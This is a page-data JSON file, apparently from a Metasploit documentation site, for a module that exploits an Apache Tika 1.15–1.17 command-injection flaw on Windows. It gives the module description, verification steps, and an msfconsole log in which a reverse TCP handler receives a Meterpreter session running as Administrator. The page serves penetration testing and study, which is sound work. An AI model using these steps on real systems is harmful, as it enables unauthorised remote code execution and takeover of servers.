{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/apache_tika_jp2_jscript","result":{"data":{"moduleMetadataJson":{"id":"1423bb4a-bc72-5c85-b35f-679ffeaa9d18","name":"Apache Tika Header Command Injection","fullname":"exploit/windows/http/apache_tika_jp2_jscript","description":"This module exploits a command injection vulnerability in Apache\n        Tika 1.15 - 1.17 on Windows.  A file with the image/jp2 content-type is\n        used to bypass magic bytes checking.  When OCR is specified in the\n        request, parameters can be passed to change the parameters passed\n        at command line to allow for arbitrary JScript to execute. A\n        JScript stub is passed to execute arbitrary code. This module was\n        verified against version 1.15 - 1.17 on Windows 2012.\n        While the CVE and finding show more versions vulnerable, during\n        testing it was determined only > 1.14 was exploitable due to\n        jp2 support being added.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/apache_tika_jp2_jscript","documentationSlug":"/modules/documentation/exploit/windows/http/apache_tika_jp2_jscript","referencesSlug":"/modules/references/exploit/windows/http/apache_tika_jp2_jscript"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module works against Windows installations of Apache Tika 1.15-1.17, and was successfully tested on\n1.15-1.17.  Apache Tika can be downloaded from <a href=\"https://archive.apache.org/dist/tika/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">here</a>, and requires Java to be installed.\nWhile the vulnerability is reported in more versions, exploitation was only successful against > 1.14 when jp2 was added as per\n<a href=\"https://github.com/rapid7/metasploit-framework/pull/11653#issuecomment-516159557\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">this comment</a>.</p>\n<p>  Rhino Security Labs has an Excellent write-up describing this vulnerability.  Find it on\n<a href=\"https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">rhinosecuritylabs.com</a> or\n<a href=\"https://web.archive.org/web/20190314101650/https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">wayback</a>.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploits/windows/http/apache_tika_jp2_jscript</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"117-on-windows-2012-running-as-administrator\" style=\"position:relative;\"><a href=\"#117-on-windows-2012-running-as-administrator\" aria-label=\"117 on windows 2012 running as administrator permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.17 on Windows 2012 running as Administrator</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (tika.rb)&gt; use exploits/windows/http/apache_tika_jp2_jscript\nresource (tika.rb)&gt; set rhost 2.2.2.2\nrhost =&gt; 2.2.2.2\nresource (tika.rb)&gt; set verbose true\nverbose =&gt; true\nresource (tika.rb)&gt; check\n[*] Apache Tika Version Detected: 1.17\n[+] 2.2.2.2:9998 - The target is vulnerable.\nresource (tika.rb)&gt; run\n[*] Started reverse TCP handler on 1.1.1.1:4444 \n[*] Powershell command length: 2278\n[*] Sending PUT request to 2.2.2.2:9998/meta\n[*] Sending stage (179779 bytes) to 2.2.2.2\n[*] Meterpreter session 1 opened (1.1.1.1:4444 -&gt; 2.2.2.2:49313) at 2019-03-28 21:33:09 -0400\n\nmeterpreter &gt; getuid\nServer username: WIN-OBKF2JFCDKL\\Administrator\nmeterpreter &gt; getpid\nCurrent pid: 1552\nmeterpreter &gt; sysinfo\nComputer        : WIN-OBKF2JFCDKL\nOS              : Windows 2012 (Build 9200).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x86/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"1423bb4a-bc72-5c85-b35f-679ffeaa9d18"}}}